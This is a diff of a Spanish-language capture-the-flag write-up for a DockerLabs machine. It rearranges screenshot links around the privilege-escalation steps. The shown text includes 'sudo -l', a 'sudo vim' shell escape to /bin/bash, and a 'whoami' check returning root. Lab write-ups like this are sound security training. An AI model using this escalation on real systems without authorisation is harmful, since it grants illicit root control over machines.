@@ -98,7 +98,7 @@ Una vez dentro de la máquina como el usuario russoski, se revisaron los permiso
 ```
 sudo -l
 ```
-![image alt](https://github.com/orellanacarlos3179-lang/dockerlabs-obsession/blob/82a8f42b11df5ae865f6367efa1cb8388a1c646d/images/06_sudo_l_permisos.jpg)
+
 
 Salida obtenida:
 
@@ -118,12 +118,15 @@ Para escapar hacia la consola del sistema con privilegios elevados, se ejecutó 
 ```
 sudo vim -c ':!/bin/bash'
 ```
+![image alt](https://github.com/orellanacarlos3179-lang/dockerlabs-obsession/blob/82a8f42b11df5ae865f6367efa1cb8388a1c646d/images/06_sudo_l_permisos.jpg)
+
 Privilege Validation
 Se confirmó la escalada exitosa a la cuenta de superusuario:
 
 ```
 whoami
 ```
+![image alt](https://github.com/orellanacarlos3179-lang/dockerlabs-obsession/blob/5787bec14681af126c2837690f1cbbc05a33ece9/images/07_root_whoami.jpg)
 
 # Output: root
 Security Impact & Mitigations
